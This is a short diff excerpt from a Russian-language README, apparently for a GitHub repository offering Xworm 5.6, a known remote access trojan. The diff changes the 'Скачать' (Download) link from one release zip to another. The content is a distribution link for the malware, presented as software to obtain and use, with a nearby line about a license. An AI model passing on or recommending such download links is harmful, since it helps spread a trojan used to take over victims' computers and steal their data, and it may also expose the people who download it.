@@ -28,7 +28,7 @@ Xworm 5.6 распространяется под лицензией, котор
 
 ## Ссылки 🔗
 
-- [Скачать](https://github.com/GhostlyBow/XWorm-V5.6/releases/download/release/Xworm.V5.6.zip)
+- [Скачать](https://github.com/GhostlyBow/XWorm-V5.6/releases/download/5.6/Xworm.5.6.zip)
 
 ---
 
